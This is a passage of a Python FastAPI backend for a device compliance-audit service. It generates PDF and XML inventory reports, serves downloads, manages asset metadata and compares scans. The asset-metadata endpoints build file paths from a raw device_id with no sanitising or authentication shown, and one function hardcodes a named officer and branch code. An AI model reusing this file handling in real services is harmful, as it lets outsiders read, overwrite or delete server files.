                        pdf_text(idx, styles["normal"]), pdf_text(p.name, styles["normal"]),
                        pdf_text(p.system_name, styles["normal"]), pdf_text(p.enable_bidi, styles["normal"]),
                        pdf_text(p.extended_printer_status, styles["normal"]), pdf_text(p.port_name, styles["normal"]),
                    ])
                else:
                    pr_rows.append([
                        pdf_text(idx, styles["normal"]), pdf_text(p, styles["normal"]),
                        pdf_text(data.computer_name, styles["normal"]),
                        pdf_text("", styles["normal"]), pdf_text("", styles["normal"]), pdf_text("", styles["normal"]),
                    ])
        else:
            pr_rows.append([pdf_text("-", styles["normal"]), pdf_text("No printers detected", styles["normal"])] + [pdf_text("-", styles["normal"])] * 4)
        elements.append(KeepTogether([
            Paragraph("Printer Details", styles["section"]),
            apply_grid_style(Table(pr_rows, colWidths=[30, 180, 80, 64, 80, 70], repeatRows=1), header=True),
            pdf_text(f"Total Printers Connected: {len(data.printers)}", styles["bold"]),
            Spacer(1, 12)
        ]))

        # ── Hardware — Basic ──────────────────────────────────────────────────
        hw = data.hardware_details
        if isinstance(hw, HardwareDetails):
            add_pair_table(elements, "Hardware Details — Basic", [
                ("CPU",          hw.cpu),
                ("RAM",          hw.ram),
                ("Logical Disk", hw.disk),
            ], styles)
        elif isinstance(hw, dict) and hw:
            add_pair_table(elements, "Hardware Details — Basic", [
                ("CPU",          str(hw.get("cpu",  "Unknown"))),
                ("RAM",          str(hw.get("ram",  "Unknown"))),
                ("Logical Disk", str(hw.get("disk", "Unknown"))),
            ], styles)

        # ── Device Identity ───────────────────────────────────────────────────
        add_pair_table(elements, "Device Identity", [
            ("Serial Number", get_hw(data, "serial_number")),
            ("Manufacturer",  get_hw(data, "manufacturer")),
            ("Model",         get_hw(data, "model")),
        ], styles)

        # ── GPU Details ───────────────────────────────────────────────────────
        gpu_list = get_hw_list(data, "gpu_details")
        gpu_rows = [[pdf_text("GPU Name", styles["bold"]), pdf_text("Driver Version", styles["bold"]), pdf_text("VRAM", styles["bold"])]]
        if gpu_list:
            for g in gpu_list:
                if isinstance(g, GpuInfo):
                    gpu_rows.append([pdf_text(g.name, styles["normal"]), pdf_text(g.driver_version, styles["normal"]), pdf_text(g.vram, styles["normal"])])
                elif isinstance(g, dict):
                    gpu_rows.append([pdf_text(g.get("name",""), styles["normal"]), pdf_text(g.get("driver_version",""), styles["normal"]), pdf_text(g.get("vram",""), styles["normal"])])
        else:
            gpu_rows.append([pdf_text("No GPU data collected", styles["normal"]), pdf_text("-", styles["normal"]), pdf_text("-", styles["normal"])])
        elements.append(KeepTogether([
            Paragraph("GPU Details", styles["section"]),
            apply_grid_style(Table(gpu_rows, colWidths=[250, 130, 124], repeatRows=1), header=True),
            Spacer(1, 12)
        ]))

        # ── Physical Network Adapters ─────────────────────────────────────────
        na_list = get_hw_list(data, "network_adapters")
        na_rows = [[
            pdf_text("Adapter Name", styles["bold"]), pdf_text("Type", styles["bold"]),
            pdf_text("Speed", styles["bold"]), pdf_text("MAC Address", styles["bold"]),
        ]]
        if na_list:
            for a in na_list:
                d = a if isinstance(a, dict) else model_to_dict(a)
                na_rows.append([
                    pdf_text(d.get("name",""),         styles["normal"]),
                    pdf_text(d.get("adapter_type",""), styles["normal"]),
                    pdf_text(d.get("speed",""),        styles["normal"]),
                    pdf_text(d.get("mac_address",""),  styles["normal"]),
                ])
        else:
            na_rows.append([pdf_text("No adapter data", styles["normal"])] + [pdf_text("-", styles["normal"])] * 3)
        elements.append(KeepTogether([
            Paragraph("Physical Network Adapters", styles["section"]),
            apply_grid_style(Table(na_rows, colWidths=[200, 130, 100, 74], repeatRows=1), header=True),
            Spacer(1, 12)
        ]))

        # ── Disk Partitions ───────────────────────────────────────────────────
        dp_list = get_hw_list(data, "disk_partitions")
        dp_rows = [[
            pdf_text("Partition", styles["bold"]), pdf_text("Type", styles["bold"]),
            pdf_text("Size", styles["bold"]), pdf_text("Bootable", styles["bold"]),
        ]]
        if dp_list:
            for p in dp_list:
                d = p if isinstance(p, dict) else model_to_dict(p)
                dp_rows.append([
                    pdf_text(d.get("name",""),     styles["normal"]),
                    pdf_text(d.get("type",""),     styles["normal"]),
                    pdf_text(d.get("size_gb",""),  styles["normal"]),
                    pdf_text(d.get("bootable",""), styles["normal"]),
                ])
        else:
            dp_rows.append([pdf_text("No partition data", styles["normal"])] + [pdf_text("-", styles["normal"])] * 3)
        elements.append(KeepTogether([
            Paragraph("Disk Partitions", styles["section"]),
            apply_grid_style(Table(dp_rows, colWidths=[200, 120, 110, 74], repeatRows=1), header=True),
            Spacer(1, 12)
        ]))

        # ── Peripherals ───────────────────────────────────────────────────────
        peri_list = get_hw_list(data, "peripherals")
        peri_rows = [[pdf_text("Device Name", styles["bold"]), pdf_text("Type", styles["bold"]), pdf_text("Status", styles["bold"])]]
        if peri_list:
            for p in peri_list:
                d = p if isinstance(p, dict) else model_to_dict(p)
                peri_rows.append([
                    pdf_text(d.get("name",""),   styles["normal"]),
                    pdf_text(d.get("type",""),   styles["normal"]),
                    pdf_text(d.get("status",""), styles["normal"]),
                ])
        else:
            peri_rows.append([pdf_text("No peripheral data", styles["normal"]), pdf_text("-", styles["normal"]), pdf_text("-", styles["normal"])])
        elements.append(KeepTogether([
            Paragraph("Connected Peripherals", styles["section"]),
            apply_grid_style(Table(peri_rows, colWidths=[300, 120, 84], repeatRows=1), header=True),
            Spacer(1, 12)
        ]))

        # ── Network Details ───────────────────────────────────────────────────
        net_rows = [[pdf_text("IP Address", styles["bold"]), pdf_text("Gateway", styles["bold"]), pdf_text("MAC", styles["bold"])]]
        if data.network_details:
            for net in data.network_details:
                if isinstance(net, NetworkDetails):
                    net_rows.append([pdf_text(net.ip_address, styles["normal"]), pdf_text(net.gateway, styles["normal"]), pdf_text(net.mac, styles["normal"])])
                elif isinstance(net, dict):
                    net_rows.append([pdf_text(net.get("ip_address",""), styles["normal"]), pdf_text(net.get("gateway",""), styles["normal"]), pdf_text(net.get("mac",""), styles["normal"])])
        else:
            net_rows.append([pdf_text("-", styles["normal"]), pdf_text("No active adapters", styles["normal"]), pdf_text("-", styles["normal"])])
        elements.append(KeepTogether([
            Paragraph("Network Configuration", styles["section"]),
            apply_grid_style(Table(net_rows, colWidths=[168, 168, 168], repeatRows=1), header=True),
            Spacer(1, 12)
        ]))

        # ── User Accounts ─────────────────────────────────────────────────────
        usr_rows = [[pdf_text("Username", styles["bold"]), pdf_text("Disabled", styles["bold"])]]
        if data.user_accounts:
            for u in data.user_accounts:
                if isinstance(u, UserAccount):
                    usr_rows.append([pdf_text(u.name, styles["normal"]), pdf_text(u.disabled, styles["normal"])])
                elif isinstance(u, dict):
                    usr_rows.append([pdf_text(u.get("name",""), styles["normal"]), pdf_text(u.get("disabled",""), styles["normal"])])
        else:
            usr_rows.append([pdf_text("-", styles["normal"]), pdf_text("No local users found", styles["normal"])])
        elements.append(KeepTogether([
            Paragraph("Local User Accounts", styles["section"]),
            apply_grid_style(Table(usr_rows, colWidths=[252, 252], repeatRows=1), header=True),
            Spacer(1, 12)
        ]))

        # ── Software Inventory ────────────────────────────────────────────────
        sw_rows = [[
            pdf_text("#", styles["bold"]), pdf_text("Application Name", styles["bold"]),
            pdf_text("Version", styles["bold"]), pdf_text("Publisher", styles["bold"]),
            pdf_text("Install Date", styles["bold"]), pdf_text("Size", styles["bold"]),
        ]]
        if data.software_inventory:
            for idx, sw in enumerate(data.software_inventory, 1):
                d = sw if isinstance(sw, dict) else model_to_dict(sw)
                sw_rows.append([
                    pdf_text(idx,                    styles["small"]),
                    pdf_text(d.get("name",""),       styles["small"]),
                    pdf_text(d.get("version",""),    styles["small"]),
                    pdf_text(d.get("publisher",""),  styles["small"]),
                    pdf_text(d.get("install_date",""), styles["small"]),
                    pdf_text(d.get("size_mb",""),    styles["small"]),
                ])
        else:
            sw_rows.append([pdf_text("-", styles["normal"]), pdf_text("No software data collected", styles["normal"])] + [pdf_text("-", styles["normal"])] * 4)
        elements.append(Paragraph("Installed Software Inventory", styles["section"]))
        elements.append(pdf_text(f"Total Applications: {len(data.software_inventory)}", styles["bold"]))
        elements.append(Spacer(1, 6))
        elements.append(apply_grid_style(Table(sw_rows, colWidths=[28, 180, 70, 110, 68, 48], repeatRows=1), header=True))
        elements.append(Spacer(1, 12))

        doc.build(elements, onFirstPage=draw_page_decorations, onLaterPages=draw_page_decorations)
        logger.info(f"PDF built: {pdf_path}")

    except Exception as e:
        logger.error(f"PDF generation failed: {e}")

    # ── XML Generation ────────────────────────────────────────────────────────
    try:
        root = ET.Element("NsdlComplianceAudit", version="3.0.0")

        meta = ET.SubElement(root, "UserDetails")
        ET.SubElement(meta, "BranchName").text     = branch_name
        ET.SubElement(meta, "BranchCode").text     = branch_code
        ET.SubElement(meta, "OfficerName").text    = officer_name
        ET.SubElement(meta, "ExecutionDateTime").text = audit_time
        ET.SubElement(meta, "Consent").text        = data.consent

        os_xml = ET.SubElement(root, "OperatingSystem")
        ET.SubElement(os_xml, "OSName").text        = data.os_name
        ET.SubElement(os_xml, "OSVersion").text     = data.os_version
        ET.SubElement(os_xml, "OSArchitecture").text = data.architecture
        ET.SubElement(os_xml, "CSName").text        = data.computer_name
        ET.SubElement(os_xml, "LicenseStatus").text = data.license_status

        updates_xml = ET.SubElement(root, "OSUpdateDetails")
        for hf in data.hotfixes:
            item = ET.SubElement(updates_xml, "Hotfix")
            if isinstance(hf, HotfixData):
                ET.SubElement(item, "Caption").text     = hf.caption
                ET.SubElement(item, "CSName").text      = hf.cs_name
                ET.SubElement(item, "Description").text = hf.description
                ET.SubElement(item, "FixID").text       = hf.fix_id
                ET.SubElement(item, "InstalledOn").text = hf.installed_on
            else:
                ET.SubElement(item, "FixID").text = clean_string(hf, "")

        ET.SubElement(root, "MacAddress").text          = data.mac_address
        ET.SubElement(root, "DriveName").text           = data.drive_name
        ET.SubElement(root, "CompressionUtilities").text = compression_str
        ET.SubElement(root, "Antivirus").text           = av_str

        printers_xml = ET.SubElement(root, "PrinterDetails")
        for p in data.printers:
            item = ET.SubElement(printers_xml, "Printer")
            if isinstance(p, PrinterData):
                ET.SubElement(item, "Name").text                  = p.name
                ET.SubElement(item, "SystemName").text            = p.system_name
                ET.SubElement(item, "EnableBIDI").text            = p.enable_bidi
                ET.SubElement(item, "ExtendedPrinterStatus").text = p.extended_printer_status
                ET.SubElement(item, "PortName").text              = p.port_name
            else:
                ET.SubElement(item, "Name").text = clean_string(p, "")
        ET.SubElement(printers_xml, "TotalPrinterConnected").text = str(len(data.printers))

        hw_xml = ET.SubElement(root, "HardwareDetails")
        ET.SubElement(hw_xml, "CPU").text          = get_hw(data, "cpu")
        ET.SubElement(hw_xml, "RAM").text          = get_hw(data, "ram")
        ET.SubElement(hw_xml, "Disk").text         = get_hw(data, "disk")
        ET.SubElement(hw_xml, "SerialNumber").text = get_hw(data, "serial_number")
        ET.SubElement(hw_xml, "Manufacturer").text = get_hw(data, "manufacturer")
        ET.SubElement(hw_xml, "Model").text        = get_hw(data, "model")

        gpus_xml = ET.SubElement(hw_xml, "GPUList")
        for g in get_hw_list(data, "gpu_details"):
            d = g if isinstance(g, dict) else model_to_dict(g)
            gi = ET.SubElement(gpus_xml, "GPU")
            ET.SubElement(gi, "Name").text          = d.get("name", "")
            ET.SubElement(gi, "DriverVersion").text = d.get("driver_version", "")
            ET.SubElement(gi, "VRAM").text          = d.get("vram", "")

        nas_xml = ET.SubElement(hw_xml, "NetworkAdapters")
        for a in get_hw_list(data, "network_adapters"):
            d = a if isinstance(a, dict) else model_to_dict(a)
            ai = ET.SubElement(nas_xml, "Adapter")
            ET.SubElement(ai, "Name").text        = d.get("name", "")
            ET.SubElement(ai, "Type").text        = d.get("adapter_type", "")
            ET.SubElement(ai, "Speed").text       = d.get("speed", "")
            ET.SubElement(ai, "MACAddress").text  = d.get("mac_address", "")

        dps_xml = ET.SubElement(hw_xml, "DiskPartitions")
        for p in get_hw_list(data, "disk_partitions"):
            d = p if isinstance(p, dict) else model_to_dict(p)
            pi = ET.SubElement(dps_xml, "Partition")
            ET.SubElement(pi, "Name").text     = d.get("name", "")
            ET.SubElement(pi, "Type").text     = d.get("type", "")
            ET.SubElement(pi, "SizeGB").text   = d.get("size_gb", "")
            ET.SubElement(pi, "Bootable").text = d.get("bootable", "")

        peri_xml = ET.SubElement(hw_xml, "Peripherals")
        for p in get_hw_list(data, "peripherals"):
            d = p if isinstance(p, dict) else model_to_dict(p)
            pe = ET.SubElement(peri_xml, "Device")
            ET.SubElement(pe, "Name").text   = d.get("name", "")
            ET.SubElement(pe, "Type").text   = d.get("type", "")
            ET.SubElement(pe, "Status").text = d.get("status", "")

        sw_xml = ET.SubElement(root, "SoftwareInventory")
        ET.SubElement(sw_xml, "TotalInstalled").text = str(len(data.software_inventory))
        for sw in data.software_inventory:
            d = sw if isinstance(sw, dict) else model_to_dict(sw)
            si = ET.SubElement(sw_xml, "Application")
            ET.SubElement(si, "Name").text        = d.get("name", "")
            ET.SubElement(si, "Version").text     = d.get("version", "")
            ET.SubElement(si, "Publisher").text   = d.get("publisher", "")
            ET.SubElement(si, "InstallDate").text = d.get("install_date", "")
            ET.SubElement(si, "SizeMB").text      = d.get("size_mb", "")

        tree = ET.ElementTree(root)
        tree.write(xml_path, encoding="utf-8", xml_declaration=True)
        logger.info(f"XML built: {xml_path}")

    except Exception as e:
        logger.error(f"XML generation failed: {e}")

    if not os.path.exists(pdf_path) or not os.path.exists(xml_path):
        sessions[cid] = {
            "status": "failed", "branch_name": branch_name, "branch_code": branch_code,
            "officer_name": officer_name, "error": "Report generation failed.",
            "pdf_path": pdf_path if os.path.exists(pdf_path) else None,
            "xml_path": xml_path if os.path.exists(xml_path) else None,
        }
        raise HTTPException(status_code=500, detail="Audit report generation failed.")

    sessions[cid] = {
        "status": "completed", "branch_name": branch_name, "branch_code": branch_code,
        "officer_name": officer_name, "pdf_path": pdf_path, "xml_path": xml_path,
    }
    return {"status": "success", "pdf_report": pdf_path, "xml_report": xml_path}


def generate_pdf_for_device(client_id: str) -> str:
    """Dynamically build a ReportLab PDF report from SQLite database audit records."""
    raw_audit = None
    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.execute('''
                SELECT audit_data FROM device_audits 
                WHERE mac_address = ? OR computer_name = ? OR id = ?
                ORDER BY id DESC LIMIT 1
            ''', (client_id, client_id, client_id))
            row = cursor.fetchone()
            if row and row["audit_data"]:
                raw_audit = json.loads(row["audit_data"])
            else:
                cursor2 = conn.execute('''
                    SELECT raw_payload FROM device_audits_v2 
                    WHERE mac_address = ? OR computer_name = ? OR id = ?
                    ORDER BY id DESC LIMIT 1
                ''', (client_id, client_id, client_id))
                row2 = cursor2.fetchone()
                if row2 and row2["raw_payload"]:
                    raw_audit = json.loads(row2["raw_payload"])
    except Exception as e:
        logger.error(f"Error querying database for device '{client_id}': {e}")

    if not raw_audit:
        return None

    try:
        if isinstance(raw_audit, dict) and "software_inventory" in raw_audit:
            data = AuditData(**raw_audit)
        else:
            data = AuditData(
                computer_name=raw_audit.get("computer_name", client_id),
                os_name=raw_audit.get("os_name", "Windows / macOS"),
                os_version=raw_audit.get("os_version", ""),
                architecture=raw_audit.get("architecture", "64-bit"),
                license_status=raw_audit.get("license_status", "Licensed"),
                mac_address=raw_audit.get("mac_address", client_id),
                software_inventory=raw_audit.get("software_inventory", []),
                hardware_details=raw_audit.get("hardware_details", {}),
                execution_datetime=raw_audit.get("execution_datetime", datetime.now().strftime("%d-%b-%Y_%H:%M:%S")),
            )

        clean_cid = "".join(x for x in client_id if x.isalnum() or x in "._-").strip() or "device"
        pdf_path = f"{USER_INFO_DIR}/AuditReport_{clean_cid}.pdf"

        doc = SimpleDocTemplate(
            pdf_path, pagesize=letter,
            leftMargin=54, rightMargin=54, topMargin=54, bottomMargin=54,
        )
        styles = make_styles()
        elements = [Paragraph("Compliance Inspection Report", styles["title"])]

        av_str = list_text(data.antivirus)
        compression_str = list_text(data.compression_utilities)

        add_pair_table(elements, "User & Branch Metadata", [
            ("User Branch Name", "RELIGARE BROKING LIMITED"),
            ("User Branch Code", "8301231"),
            ("User Officer Name", "SANDIP BALIRAM LOKHANDE"),
            ("Execution DateTime", data.execution_datetime),
            ("Consent Verified", data.consent or "Y"),
        ], styles)

        add_pair_table(elements, "Operating System & Identity", [
            ("OS Name", data.os_name),
            ("OS Version", data.os_version),
            ("OS Architecture", data.architecture),
            ("Computer Hostname", data.computer_name),
            ("License Status", data.license_status),
            ("MAC Address", data.mac_address),
        ], styles)

        add_pair_table(elements, "Hardware Overview", [
            ("Serial Number", get_hw(data, "serial_number")),
            ("Manufacturer", get_hw(data, "manufacturer")),
            ("Model", get_hw(data, "model")),
            ("CPU Processor", get_hw(data, "cpu")),
            ("RAM Memory", get_hw(data, "ram")),
            ("Logical Disk", get_hw(data, "disk")),
        ], styles)

        sw_list = data.software_inventory or []
        sw_rows = [[pdf_text("App Name", styles["bold"]), pdf_text("Version", styles["bold"]), pdf_text("Publisher", styles["bold"])]]
        for sw in sw_list[:150]:
            d = sw if isinstance(sw, dict) else model_to_dict(sw)
            sw_rows.append([
                pdf_text(d.get("name", ""), styles["normal"]),
                pdf_text(d.get("version", ""), styles["normal"]),
                pdf_text(d.get("publisher", ""), styles["normal"]),
            ])
        elements.append(KeepTogether([
            Paragraph(f"Installed Software Inventory ({len(sw_list)} Total Apps)", styles["section"]),
            apply_grid_style(Table(sw_rows, colWidths=[240, 110, 154], repeatRows=1), header=True),
            Spacer(1, 12)
        ]))

        doc.build(elements, onFirstPage=draw_page_decorations, onLaterPages=draw_page_decorations)
        return pdf_path
    except Exception as err:
        logger.error(f"Failed to dynamically build PDF for {client_id}: {err}")
        return None


# ==============================================================================
# 6. REPORT SERVING
# ==============================================================================
@app.get("/download-report")
def download_report(client_id: str = Query(...), format: str = Query("pdf"), action: str = Query("download")):
    fp = None
    session = sessions.get(client_id)
    if session and session.get("pdf_path") and os.path.exists(session["pdf_path"]):
        fp = session["pdf_path"]
    else:
        fp = generate_pdf_for_device(client_id)

    if not fp or not os.path.exists(fp):
        raise HTTPException(status_code=404, detail=f"Audit report for device '{client_id}' not found.")

    disposition = "inline" if action == "view" else "attachment"
    clean_mac_name = client_id.replace(":", "_").replace(" ", "_")
    download_filename = f"AuditReport_{clean_mac_name}.pdf"
    return FileResponse(fp, media_type="application/pdf", filename=download_filename, content_disposition_type=disposition)


# ==============================================================================
# 7. ASSET METADATA — PHASE 3
# ==============================================================================
@app.post("/asset-metadata")
def save_asset_metadata(metadata: AssetMetadata):
    metadata.last_updated = datetime.now().isoformat()
    path = f"{ASSET_METADATA_DIR}/{metadata.device_id}.json"
    try:
        with open(path, "w") as f:
            json.dump(model_to_dict(metadata), f, indent=4)
        logger.info(f"Asset metadata saved: {metadata.device_id}")
        return {"status": "saved", "device_id": metadata.device_id}
    except Exception as e:
        logger.error(f"Failed to save asset metadata: {e}")
        raise HTTPException(status_code=500, detail="Failed to save metadata.")


@app.get("/asset-metadata/{device_id}")
def get_asset_metadata(device_id: str):
    path = f"{ASSET_METADATA_DIR}/{device_id}.json"
    if not os.path.exists(path):
        raise HTTPException(status_code=404, detail="Asset not found.")
    with open(path) as f:
        return json.load(f)


@app.put("/asset-metadata/{device_id}")
def update_asset_metadata(device_id: str, metadata: AssetMetadata):
    metadata.device_id   = device_id
    metadata.last_updated = datetime.now().isoformat()
    path = f"{ASSET_METADATA_DIR}/{device_id}.json"
    with open(path, "w") as f:
        json.dump(model_to_dict(metadata), f, indent=4)
    return {"status": "updated", "device_id": device_id}


@app.delete("/asset-metadata/{device_id}")
def delete_asset_metadata(device_id: str):
    path = f"{ASSET_METADATA_DIR}/{device_id}.json"
    if not os.path.exists(path):
        raise HTTPException(status_code=404, detail="Asset not found.")
    os.remove(path)
    return {"status": "deleted", "device_id": device_id}


@app.get("/assets")
def list_assets():
    assets = []
    if os.path.exists(ASSET_METADATA_DIR):
        for fn in os.listdir(ASSET_METADATA_DIR):
            if fn.endswith(".json"):
                try:
                    with open(f"{ASSET_METADATA_DIR}/{fn}") as f:
                        assets.append(json.load(f))
                except Exception:
                    pass
    assets.sort(key=lambda x: x.get("last_updated", ""), reverse=True)
    return {"assets": assets, "total": len(assets)}


# ==============================================================================
# 8. AUDIT DEVICE & SOFTWARE QUERIES
# ==============================================================================
@app.get("/devices")
@app.get("/api/devices")
def list_audited_devices():
    devices = {}
    with sqlite3.connect(DB_PATH) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.execute('''
            SELECT mac_address, computer_name, os_name, execution_datetime, audit_data
            FROM device_audits
            ORDER BY id DESC, execution_datetime DESC
        ''')
        for row in cursor:
            name = (row['computer_name'] or "Unknown").strip()
            os_name = (row['os_name'] or "Unknown").strip()
            
            # Categorize OS family to pair same OS versions (e.g. Windows 10 vs 11 or macOS vs macOS)
            os_lower = os_name.lower()
            if "windows" in os_lower:
                os_family = "windows"
            elif "mac" in os_lower:
                os_family = "mac"
            elif "ubuntu" in os_lower or "linux" in os_lower:
                os_family = "linux"
            else:
                os_family = os_lower

            key = (name.lower(), os_family)
            if key not in devices:
                user = "Unknown"
                model_name = ""
                if row['audit_data']:
                    try:
                        ad = json.loads(row['audit_data'])
                        user = ad.get("current_user") or ad.get("user") or "Unknown"
                        hw = ad.get("hardware_details", {})
                        if isinstance(hw, dict):
                            mfr = (hw.get("manufacturer") or "").strip()
                            mdl = (hw.get("model") or "").strip()
                            if mfr and mdl and mdl != "Unknown" and mdl != "N/A":
                                if "ASUSTeK" in mfr or "ASUS" in mfr:
                                    mfr = "ASUS"
                                elif "Hewlett" in mfr or "HP" in mfr:
                                    mfr = "HP"
                                elif "Lenovo" in mfr:
                                    mfr = "Lenovo"
                                elif "Dell" in mfr:
                                    mfr = "Dell"
                                elif "Apple" in mfr:
                                    mfr = "Apple"
                                mdl_clean = mdl.split('_')[0].strip()
                                if mdl_clean.lower().startswith(mfr.lower()):
                                    model_name = mdl_clean
                                else:
                                    model_name = f"{mfr} {mdl_clean}".strip()
                    except Exception:
                        pass

                mac = row['mac_address']
                uid = mac if mac and mac != "Unknown" else name
                devices[key] = {
                    "id": uid,
                    "computer_name": name,
                    "model_name": model_name or name,
                    "os_name": os_name,
                    "username": user,
                    "last_seen": row['execution_datetime']
                }

    device_list = list(devices.values())
    device_list.sort(key=lambda x: x.get("last_seen", ""), reverse=True)
    return {"devices": device_list, "total": len(device_list)}



@app.get("/api/software/{device_id}")
def get_software_for_device(device_id: str):
    latest_data = None
    with sqlite3.connect(DB_PATH) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.execute('''
            SELECT audit_data, execution_datetime FROM device_audits 
            WHERE mac_address = ? COLLATE NOCASE OR computer_name = ? COLLATE NOCASE
            ORDER BY id DESC, execution_datetime DESC LIMIT 1
        ''', (device_id, device_id))
        row = cursor.fetchone()
        if row:
            latest_data = json.loads(row['audit_data'])
            latest_ts = row['execution_datetime']

    if not latest_data:
        raise HTTPException(status_code=404, detail=f"No audit found for device: {device_id}")
    return {
        "id":                 device_id,
        "computer_name":      latest_data.get("computer_name", "Unknown"),
        "current_user":       latest_data.get("current_user", "Unknown"),
        "last_audit":         latest_ts,
        "software_inventory": latest_data.get("software_inventory", []),
        "total":              len(latest_data.get("software_inventory", [])),
        "os_name":            latest_data.get("os_name", ""),
        "os_version":         latest_data.get("os_version", ""),
        "os_build":           latest_data.get("os_build", ""),
        "last_boot":          latest_data.get("last_boot", ""),
        "uptime":             latest_data.get("uptime", ""),
        "architecture":       latest_data.get("architecture", ""),
        "license_status":     latest_data.get("license_status", ""),
        "firewall":           latest_data.get("firewall", "Unknown"),
        "bitlocker":          latest_data.get("bitlocker", "Unknown"),
        "secure_boot":        latest_data.get("secure_boot", "Unknown"),
        "tpm":                latest_data.get("tpm", "Unknown"),
        "hardware_details":   latest_data.get("hardware_details", {}),
        "network_details":    latest_data.get("network_details", []),
        "user_accounts":      latest_data.get("user_accounts", []),
        "login_history":      latest_data.get("login_history", []),
        "hotfixes":           latest_data.get("hotfixes", []),
        "antivirus":          latest_data.get("antivirus", "")
    }



# ==============================================================================
# 8c. PROGRESSIVE DIFF — COMPARE LAST TWO SCANS
# ==============================================================================
@app.get("/api/device-diff/{device_id}")
def get_device_diff(device_id: str):
    """
    Compare the two most recent audit scans for a device.
    Returns: newly installed apps, removed apps, hardware changes.
    """
    scans = []
    with sqlite3.connect(DB_PATH) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.execute('''
            SELECT audit_data, execution_datetime FROM device_audits 
            WHERE mac_address = ? COLLATE NOCASE OR computer_name = ? COLLATE NOCASE
            ORDER BY execution_datetime DESC LIMIT 2
        ''', (device_id, device_id))
        for row in cursor:
            scans.append((row['execution_datetime'], json.loads(row['audit_data'])))

    if len(scans) < 2:
        return {
            "has_diff": False,
            "message": "Need at least 2 scans to generate a change report.",
            "scan_count": len(scans),
        }


    # Sort by datetime string ascending — latest last
    scans.sort(key=lambda x: x[0])
    prev_ts,  prev  = scans[-2]
    curr_ts,  curr  = scans[-1]

    # ── Software diff ─────────────────────────────────────────────────────────
    def sw_key(entry):
        """Unique key: lowercase name + version."""
        if isinstance(entry, dict):
            return f"{(entry.get('name') or '').strip().lower()}||{(entry.get('version') or '').strip()}"
        return ""

    prev_sw = {sw_key(s): s for s in prev.get("software_inventory", []) if sw_key(s)}
    curr_sw = {sw_key(s): s for s in curr.get("software_inventory", []) if sw_key(s)}

    installed_keys = set(curr_sw) - set(prev_sw)
    removed_keys   = set(prev_sw) - set(curr_sw)

    newly_installed = [curr_sw[k] for k in sorted(installed_keys)]
    newly_removed   = [prev_sw[k] for k in sorted(removed_keys)]

    # ── Hardware diff ─────────────────────────────────────────────────────────
    hw_changes = []
    hw_fields  = [
        ("cpu",           "Processor (CPU)"),
        ("ram",           "Memory (RAM)"),
        ("disk",          "Storage"),
        ("serial_number", "Serial Number"),
        ("manufacturer",  "Manufacturer"),
        ("model",         "Model"),
    ]
    prev_hw = prev.get("hardware_details", {}) if isinstance(prev.get("hardware_details"), dict) else {}
    curr_hw = curr.get("hardware_details", {}) if isinstance(curr.get("hardware_details"), dict) else {}

    for field, label in hw_fields:
        pv = str(prev_hw.get(field, "Unknown") or "Unknown").strip()
        cv = str(curr_hw.get(field, "Unknown") or "Unknown").strip()
        if pv != cv:
            hw_changes.append({"field": label, "previous": pv, "current": cv})

    # OS changes
    for field, label in [("os_name", "OS Name"), ("os_version", "OS Version"), ("architecture", "Architecture")]:
        pv = str(prev.get(field, "Unknown") or "Unknown").strip()
        cv = str(curr.get(field, "Unknown") or "Unknown").strip()
        if pv != cv:
            hw_changes.append({"field": label, "previous": pv, "current": cv})

    return {
        "has_diff":        True,
        "scan_count":      len(scans),
        "previous_scan":   prev_ts,
        "current_scan":    curr_ts,
        "newly_installed": newly_installed,
        "newly_removed":   newly_removed,
        "hw_changes":      hw_changes,
        "summary": {
            "installed_count": len(newly_installed),
            "removed_count":   len(newly_removed),
            "hw_change_count": len(hw_changes),
        }
    }



# ==============================================================================
@app.get("/api/download-device-pdf/{device_id}")
def download_device_pdf(device_id: str):
    """Find the latest PDF report for a given device_id and return it as a download."""
    best_pdf = None
    best_ts  = ""
    computer_name = device_id

    if os_module.path.exists(USER_INFO_DIR):
        for fn in os_module.listdir(USER_INFO_DIR):
            if not (fn.endswith(".json") and fn.startswith("audit_")):
                continue
            try:
                with open(f"{USER_INFO_DIR}/{fn}") as f:
                    d = json.load(f)
                mac = d.get("mac_address", "Unknown")
                name = d.get("computer_name", "Unknown")
                uid = mac if mac != "Unknown" else name
                if uid.lower() != device_id.lower():
                    continue
                ts = d.get("execution_datetime", "")
                if ts > best_ts:
                    # Derive the expected PDF path from the JSON filename
                    pdf_path = f"{USER_INFO_DIR}/{fn[:-5]}.pdf"  # swap .json -> .pdf
                    if os_module.path.exists(pdf_path):
                        best_ts  = ts
                        best_pdf = pdf_path
                        computer_name = name
            except Exception:
                pass

    if not best_pdf:
        raise HTTPException(
            status_code=404,
            detail=f"No PDF report found for device: {device_id}"
        )

    safe_name = "".join(x for x in computer_name if x.isalnum() or x in "._- ").strip()
    filename  = f"AuditReport_{safe_name}.pdf"
    return FileResponse(
        best_pdf,
        media_type="application/pdf",
        filename=filename,
        content_disposition_type="attachment",
    )


def get_audit_indexes():
    audit_index: dict = {}
    audit_mac_index: dict = {}
    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.execute("SELECT mac_address, computer_name, os_name, execution_datetime, audit_data FROM device_audits ORDER BY id DESC")
            for row in cursor:
                c_name = row['computer_name'] or "Unknown"
                c_mac  = row['mac_address'] or "Unknown"
                d_os   = row['os_name'] or "Unknown"
                last_dt = row['execution_datetime'] or ""
                c_user = "Unknown"
                net_ips = []
                if row['audit_data']:
                    try:
                        ad = json.loads(row['audit_data'])
                        c_user = ad.get("current_user") or "Unknown"
                        users  = ad.get("user_accounts", [])
                        if c_user == "Unknown" and users and isinstance(users, list):
                            c_user = users[0].get("name", "Unknown") if isinstance(users[0], dict) else "Unknown"
                        for net in ad.get("network_details", []):
                            if isinstance(net, dict):
                                raw_ip = net.get("ip_address", "") or net.get("ipv4", "")
                                for ip_part in str(raw_ip).split(","):
                                    ip_clean = ip_part.strip()
                                    if ip_clean and ip_clean not in ("Unknown", "N/A", ""):
                                        net_ips.append(ip_clean)
                    except Exception:
                        pass
                info = {
                    "id":            c_mac if c_mac != "Unknown" else c_name,
                    "computer_name": c_name,
                    "os_name":       d_os,
                    "username":      c_user,
                    "last_audit":    last_dt
                }
                if c_mac != "Unknown":
                    clean_mac = c_mac.replace(":", "").replace("-", "").upper()
                    if clean_mac not in audit_mac_index:
